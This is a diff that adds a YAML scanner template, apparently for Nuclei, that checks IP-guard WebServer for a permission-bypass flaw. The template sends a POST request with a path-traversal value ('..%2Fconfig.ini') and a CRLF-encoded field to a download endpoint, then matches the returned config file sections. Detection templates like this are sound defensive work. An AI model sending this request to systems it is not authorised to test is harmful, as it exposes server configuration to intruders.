@@ -1,0 +1,27 @@
+id: ip-guard-permission-bypass
+info:
+  name: IP-guard WebServer Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: permission-bypass
+http:
+  - method: POST
+    path:
+      - "/ipg/appr/MApplyList/downloadFile_client/getdatarecord"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[webconfig]"
+          - "[viewcfg]"
+      - type: word
+        part: header
+        words:
+          - "application/x-wine-extension-ini"
+      - type: status
+        status:
+          - 200
